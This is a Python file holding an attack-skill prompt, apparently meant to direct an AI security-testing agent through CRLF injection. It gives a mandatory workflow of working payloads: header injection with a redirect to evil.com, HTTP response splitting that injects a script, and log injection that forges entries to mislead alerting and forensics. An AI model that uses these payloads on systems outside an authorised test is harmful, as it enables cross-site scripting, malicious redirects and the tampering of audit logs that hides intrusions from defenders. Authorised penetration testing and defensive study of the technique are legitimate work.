"""
CRLF Injection Attack Skill Prompt.
"""

CRLF_SKILL_PROMPT = """
## ATTACK SKILL: CRLF INJECTION

### MANDATORY WORKFLOW

#### STEP 1: HEADER INJECTION
Inject `%0d%0a` (CRLF) into URL parameters or request headers:
```
/search?q=test%0d%0aInjected-Header:value
/redirect?url=/safe%0d%0aLocation:http://evil.com
```

#### STEP 2: RESPONSE SPLITTING
```
%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
```

#### STEP 3: LOG INJECTION
```
User-Agent: Mozilla%0d%0aAdmin-Action:delete-all
```
→ Injects false log entries, can poison log-based alerting or forensic tools.

#### ANTI-PATTERNS: Don't forget URL-encoded variants (%0d%0a, %0D%0A). Test both GET and POST parameters.
"""
